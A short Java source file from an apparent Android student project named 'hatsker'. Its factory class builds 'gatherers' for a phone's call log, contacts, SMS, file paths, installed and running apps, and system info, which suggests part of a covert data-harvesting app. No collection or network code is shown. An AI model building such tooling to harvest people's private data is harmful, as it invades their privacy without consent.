package com.example.student.hatsker;

import android.content.Context;


public class GathererBuilder {

    private final int ALL_INFO_GATHERER = 0;
    private final int CALL_LOG_GATHERER = 1;
    private final int CONTACTS_GATHERER = 2;
    private final int FILES_PATHS_GATHERER = 3;
    private final int INSTALLED_APPS_GATHERER = 4;
    private final int RUNNING_APPS_GATHERER = 5;
    private final int SMS_GATHERER = 6;
    private final int SYSTEM_INFO_GATHERER = 7;

    public Gatherer build(int code)
    {
        switch (code)
        {

            case CALL_LOG_GATHERER: return new CallLogGatherer();

            case CONTACTS_GATHERER: return new ContactsGatherer();

            case FILES_PATHS_GATHERER: return new FilesPathsGatherer();

            case INSTALLED_APPS_GATHERER: return new InstalledAppsGatherer();

            case RUNNING_APPS_GATHERER: return new RunningAppsGatherer();

            case SMS_GATHERER: return new SmsGatherer();

            case SYSTEM_INFO_GATHERER: return new SystemInfoGatherer();

            default: return new Gatherer() {
                @Override
                public String getInfo(Context context) {
                    return "do u think u r right, maboy???";
                }
            };
        }

    }
}
